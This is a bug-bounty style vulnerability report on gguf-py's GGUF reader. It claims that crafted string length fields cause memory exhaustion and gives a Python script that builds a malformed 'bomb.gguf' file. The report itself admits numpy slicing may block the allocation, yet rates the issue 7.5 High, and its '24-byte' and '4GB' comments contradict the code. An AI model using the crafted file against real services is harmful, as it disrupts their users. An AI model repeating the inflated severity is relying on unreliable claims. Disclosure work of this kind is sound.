# R4: GGUF Python Reader — Unbounded String Length → DoS/Memory Exhaustion

## Vulnerability Type
Denial of Service (Resource Exhaustion) / Improper Input Validation

## CVSS 3.1 Score
**7.5 High** — `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H`

| Metric | Value |
|---|---|
| Attack Vector | Network (malicious .gguf file on Hugging Face Hub) |
| Attack Complexity | Low |
| Privileges Required | None |
| User Interaction | None |
| Scope | Unchanged |
| Confidentiality | None |
| Integrity | None |
| Availability | High |

## Description
The GGUF Python reader (`gguf-py`) in `gguf/gguf_reader.py` does not validate string length fields against actual file size when parsing GGUF model files. A malicious `.gguf` file with a crafted string length field can cause the reader to attempt allocations far exceeding the file size, leading to denial of service.

**Attack Chain:**
1. Attacker uploads a malicious `.gguf` file to Hugging Face Hub with a metadata string claiming to be gigabytes long
2. Any Python application using `gguf-py` to read/inspect the model triggers the vulnerability
3. The `_get_str()` function at line 218-219 reads the string length from the file, then attempts to read that many bytes: `self._get(offset + 8, np.uint8, slen[0])`
4. While numpy slice bounds checking may prevent the full allocation in some versions, the code path still triggers unbounded memory operations proportional to the claimed length

## Affected File(s)
- `gguf-py/gguf/gguf_reader.py` — lines 218-219 (`_get_str`), 263 (tensor name read), 292 (KV string read)

## Permalinks
1. https://github.com/ggerganov/llama.cpp/blob/master/gguf-py/gguf/gguf_reader.py#L218
2. https://github.com/ggerganov/llama.cpp/blob/master/gguf-py/gguf/gguf_reader.py#L263

## Reproduction Steps

### Step 1: Create malicious GGUF file
```python
import struct

# Create a 24-byte GGUF file claiming to have a 4GB string
magic = b'GGUF'
version = struct.pack('<I', 3)
n_tensors = struct.pack('<Q', 0)
n_kv = struct.pack('<Q', 1)

# KV: key="test", value=string claiming 2GB
key_type = struct.pack('<I', 1)  # STRING
key_len = struct.pack('<Q', 4)
key_data = b'test'
val_type = struct.pack('<I', 1)  # STRING
val_len = struct.pack('<Q', 0x7FFFFFFF)  # 2GB - 1
val_data = b'hello'  # Only 5 bytes of actual data

with open("bomb.gguf", "wb") as f:
    f.write(magic + version + n_tensors + n_kv)
    f.write(key_type + key_len + key_data)
    f.write(val_type + val_len + val_data)

print(f"Bomb created: {len(magic+version+n_tensors+n_kv+key_type+key_len+key_data+val_type+val_len+val_data)} bytes")
```

### Step 2: Load with gguf-py
```python
from gguf import GGUFReader
reader = GGUFReader("bomb.gguf")  # Triggers unbounded memory operation
```

### Step 3: PoC Script
```bash
python3 poc_gguf_python_oom.py --test
```

## PoC Script
See attached: `poc_gguf_python_oom.py`
- `--test` — creates bomb and demonstrates the vulnerability
- `--verify` — checks GitHub source for vulnerable patterns
- `--create-bomb` — generates malicious GGUF file

## Impact
- **Denial of Service** — any application using gguf-py to parse malicious GGUF files can crash or exhaust memory
- **Supply chain risk** — malicious GGUF files can be uploaded to Hugging Face Hub
- **Affects downstream** — transformers, llama-cpp-python, langchain, and any tooling that uses gguf-py for model inspection

## Technical Analysis
The `_get_str` function (line 218-219):
```python
def _get_str(self, offset: int) -> tuple[npt.NDArray[np.uint64], npt.NDArray[np.uint8]]:
    slen = self._get(offset, np.uint64)
    return slen, self._get(offset + 8, np.uint8, slen[0])
```

The `_get` function (line 197-204):
```python
def _get(self, offset: int, dtype: npt.DTypeLike, count: int = 1, ...) -> npt.NDArray[Any]:
    count = int(count)
    itemsize = int(np.empty([], dtype=dtype).itemsize)
    end_offs = offset + itemsize * count  # Can overflow for large count
    arr = self.data[offset:end_offs].view(dtype=dtype)[:count]
    return arr
```

The code computes `end_offs = offset + itemsize * count` where `count` comes directly from the file without validation. For `count = 2^31`, this becomes `offset + 2GB`. While numpy slice bounds may prevent the actual allocation in some cases, the computation itself is problematic and may behave differently on different platforms/versions.

## Remediation
Add bounds checking before reading string data:
```python
def _get_str(self, offset: int) -> tuple[npt.NDArray[np.uint64], npt.NDArray[np.uint8]]:
    slen = self._get(offset, np.uint64)
    # Validate string length against file size
    if slen[0] > len(self.data) - offset - 8:
        raise ValueError(f"String length {slen[0]} exceeds remaining file size")
    return slen, self._get(offset + 8, np.uint8, slen[0])
```

Similarly validate tensor count, KV count, and all array lengths against file size.

## References
- **CVE-2024-21836** — Integer overflow in tensor count (C++ version, patched)
- **CVE-2024-23496** — gguf_fread_str heap overflow (C++ version, patched)
- **CWE-400** — Uncontrolled Resource Consumption
- **CWE-130** — Improper Handling of Length Parameter Inconsistency

## Bounty Justification
This is the Python equivalent of previously-patched C++ vulnerabilities (CVE-2024-21836, CVE-2024-23496). The Python reader (`gguf-py`) is the official library used by the entire Python ML ecosystem to handle GGUF files. The GGUF format has a $4,000 bounty on huntr.com.
